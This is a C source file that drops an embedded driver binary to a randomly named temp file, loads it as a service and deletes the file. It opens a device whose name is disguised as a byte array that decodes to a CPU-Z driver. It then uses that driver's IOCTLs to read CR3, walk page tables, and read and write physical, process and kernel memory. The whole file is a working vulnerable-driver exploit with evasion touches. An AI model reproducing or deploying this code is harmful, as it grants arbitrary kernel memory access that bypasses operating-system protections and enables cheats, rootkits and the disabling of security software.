#include "REM.h"
#include "secret\REM_structs.h"

#include <string.h>
#include <malloc.h>

#define LODWORD(l)       ((uint32_t)(((size_t)(l)) & 0xffffffff))
#define HIDWORD(l)       ((uint32_t)((((size_t)(l)) >> 32) & 0xffffffff))

#define IOCTL_READ_CR    0x9C402428
#define IOCTL_READ_MEM   0x9C402420
#define IOCTL_WRITE_MEM  0x9C402430

unsigned
char  s_REM_DRV_BIN[21992];
uint8_t REM_UWriteBinary(const char* FileName, PVOID buffer, size_t single_lenght, size_t array_count);
uint8_t REM_UDeleteFile(const char* FileName);
void    REM_URandomName(char* result, size_t current_lenght);
void    REM_URandomTempName(char* result);

PREM_DEVICE REM_DAttachREMDevice()
{
	static
	PREM_DEVICE Device = NULL;

	if (Device == NULL)
	{

		char* ServiceName = NULL;
		char* TempFilePath = NULL;
		char* DeviceName = NULL;
		{
			char dServiceName[260] = { 0 };
			REM_URandomName(dServiceName, 0);

			char dTempFilePath[260] = { 0 };
			REM_URandomTempName(dTempFilePath);

			const char dDeviceName[] = { 92, 100, 101, 118, 105, 99, 101, 92, 99, 112, 117, 122, 49, 51, 53, 0 };

			size_t lenght = strlen(dServiceName) + 1;
			ServiceName = malloc(lenght);
			memcpy(ServiceName, dServiceName, lenght);

			lenght = strlen(dTempFilePath) + 1;
			TempFilePath = malloc(lenght);
			memcpy(TempFilePath, dTempFilePath, lenght);

			lenght = strlen(dDeviceName) + 1;
			DeviceName = malloc(lenght);
			memcpy(DeviceName, dDeviceName, lenght);
		}

		if (REM_UWriteBinary(TempFilePath, s_REM_DRV_BIN, 1, sizeof(s_REM_DRV_BIN)))
		{
			Device = REM_LoadDevice(ServiceName, DeviceName, TempFilePath);
			REM_UDeleteFile(TempFilePath);
		}
	}
	return Device;
}

int32_t DeviceIoControl(
	HANDLE     hDevice,
	uint32_t   dwIoControlCode,
	PVOID      lpInBuffer,
	uint32_t   nInBufferSize,
	PVOID      lpOutBuffer,
	uint32_t   nOutBufferSize,
	uint32_t*  lpBytesReturned,
	PVOID      lpOverlapped
);

static
uint8_t uGetCr3(PREM_DEVICE Device, HANDLE* hProcess)
{
	uint32_t cr_num = 3;
	uint32_t io = 0;
	return DeviceIoControl(Device->hDevice, IOCTL_READ_CR, &cr_num, sizeof(cr_num), hProcess, sizeof(*hProcess), &io, NULL) > 0;
}

typedef struct _input_read_mem
{
	uint32_t address_high;
	uint32_t address_low;
	uint32_t length;
	uint32_t buffer_high;
	uint32_t buffer_low;
}input_read_mem, *pinput_read_mem;

typedef struct _input_write_mem
{
	uint32_t address_high;
	uint32_t address_low;
	uint32_t value;
}input_write_mem, *pinput_write_mem;

typedef struct _output
{
	uint32_t operation;
	uint32_t buffer_low;
}output, *poutput;

static
uint8_t uReadPhysicalMemory(PREM_DEVICE Device, uint64_t address, PVOID buf, size_t len)
{
	if (address == 0 || buf == NULL)
	{
		return 0;
	}
	input_read_mem in;
	output         out;
	uint32_t       io = 0;

	in.address_high = HIDWORD(address);
	in.address_low  = LODWORD(address);
	in.length       = (uint32_t)len;
	in.buffer_high  = HIDWORD(buf);
	in.buffer_low   = LODWORD(buf);

	return DeviceIoControl(Device->hDevice, IOCTL_READ_MEM, &in, sizeof(in), &out, sizeof(out), &io, NULL) > 0;
}

static
uint8_t uWritePhysicalMemory(PREM_DEVICE Device, uint64_t address, PVOID buf, size_t len)
{
	if (address == 0 || buf == NULL || len % 4 != 0 || len == 0)
	{
		return 0;
	}
	input_write_mem in;
	output          out;
	uint32_t        io = 0;
	int32_t         status = 0;

	if (len == 4)
	{
		in.address_high = HIDWORD(address);
		in.address_low  = LODWORD(address);
		in.value       = *(uint32_t*)buf;
		status = DeviceIoControl(Device->hDevice, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, NULL);
	}
	else
	{
		for (size_t i = 0; i < len / 4; i++)
		{
			in.address_high = HIDWORD(address + 4 * i);
			in.address_low  = LODWORD(address + 4 * i);
			in.value        = ((uint32_t*)buf)[i];
			status = DeviceIoControl(Device->hDevice, IOCTL_WRITE_MEM, &in, sizeof(in), &out, sizeof(out), &io, NULL);
		}
	}
	return status > 0;
}

static
size_t translate_linear_address(PREM_DEVICE Device, HANDLE directoryTableBase, PVOID virtualAddress)
{
	size_t result = 0;
	{
		size_t   va            = (size_t)virtualAddress;
		uint16_t PML4          = (uint16_t)((va >> 39) & 0x1FF);
		uint16_t DirectoryPtr  = (uint16_t)((va >> 30) & 0x1FF);
		uint16_t Directory     = (uint16_t)((va >> 21) & 0x1FF);
		uint16_t Table         = (uint16_t)((va >> 12) & 0x1FF);
		size_t   PML4E;


		if (!uReadPhysicalMemory(Device, ((size_t)directoryTableBase + PML4 * sizeof(size_t)), &PML4E, sizeof(PML4E)))
		{
			goto end;
		}

		size_t   PDPTE;
		if (!uReadPhysicalMemory(Device, (PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(size_t), &PDPTE, sizeof(PDPTE)))
		{
			goto end;
		}

		if ((PDPTE & (1 << 7)) != 0)
		{
			result = (PDPTE & 0xFFFFFC0000000) + (va & 0x3FFFFFFF);
			goto end;
		}

		uint64_t PDE;
		if (!uReadPhysicalMemory(Device, (PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(size_t), &PDE, sizeof(PDE)))
		{
			goto end;
		}

		if ((PDE & (1 << 7)) != 0)
		{
			result = (PDE & 0xFFFFFFFE00000) + (va & 0x1FFFFF);
			goto end;
		}

		size_t PTE;
		if (!uReadPhysicalMemory(Device, (PDE & 0xFFFFFFFFFF000) + Table * sizeof(size_t), &PTE, sizeof(PTE)))
		{
			goto end;
		}
		result = (PTE & 0xFFFFFFFFFF000) + (va & 0xFFF);
	}
end:
	return result;
}

uint8_t REM_DReadVirtualMemory(PREM_PROCESS Process, PVOID Address, PVOID Buffer, size_t Lenght)
{
	uint8_t status = 0;
	{
		size_t phys = translate_linear_address(Process->Device, Process->hProcess, Address);
		if (phys > 0)
		{
			status = uReadPhysicalMemory(Process->Device, phys, Buffer, Lenght);
		}
	}
	return status;
}

uint8_t REM_DWriteVirtualMemory(PREM_PROCESS Process, PVOID Address, PVOID Buffer, size_t Lenght)
{
	uint8_t status = 0;
	{
		size_t phys = translate_linear_address(Process->Device, Process->hProcess, Address);
		if (phys > 0)
		{
			status = uWritePhysicalMemory(Process->Device, phys, Buffer, Lenght);
		}
	}
	return status;
}

uint8_t REM_DReadSystemMemory(PREM_DEVICE Device, PVOID Address, PVOID Buffer, size_t Lenght)
{
	uint8_t status = 0;
	{
		HANDLE hProcess;
		if (uGetCr3(Device, &hProcess))
		{
			size_t phys = translate_linear_address(Device, hProcess, Address);
			if (phys > 0)
			{
				status = uReadPhysicalMemory(Device, phys, Buffer, Lenght);
			}
		}
	}
	return status;
}

uint8_t REM_DWriteSystemMemory(PREM_DEVICE Device, PVOID Address, PVOID Buffer, size_t Lenght)
{
	uint8_t status = 0;
	{
		HANDLE hProcess;
		if (uGetCr3(Device, &hProcess))
		{
			size_t phys = translate_linear_address(Device, hProcess, Address);
			if (phys > 0)
			{
				status = uWritePhysicalMemory(Device, phys, Buffer, Lenght);
			}
		}
	}
	return status;
}